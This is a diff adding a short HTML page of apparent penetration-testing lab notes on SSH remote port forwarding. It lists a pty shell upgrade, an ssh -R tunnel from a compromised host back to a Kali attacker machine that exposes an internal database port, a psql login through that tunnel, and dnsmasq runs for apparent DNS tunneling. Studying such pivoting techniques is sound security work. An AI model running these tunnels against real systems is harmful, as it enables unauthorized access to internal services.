@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SSH Remote port Forwarding</title>
+</head><body>python3 -c 'import pty; pty.spawn("/bin/bash")'<br/>
+<br/>
+sudo systemctl start ssh<br/>
+<br/>
+sudo ss -ntplu<br/>
+<br/>
+psql -h 127.0.0.1 -p 1234 -U postgres<br/>
+<br/>
+ssh -N -R 127.0.0.1:1234:<b>127.0.0.1</b>:3306 kali@192.168.45.231<br/>
+<br/>
+sudo dnsmasq -C dnsmasq_txt.conf -d<br/>
+<br/>
+sudo dnsmasq -C dnsmasq.conf -d</body></html>
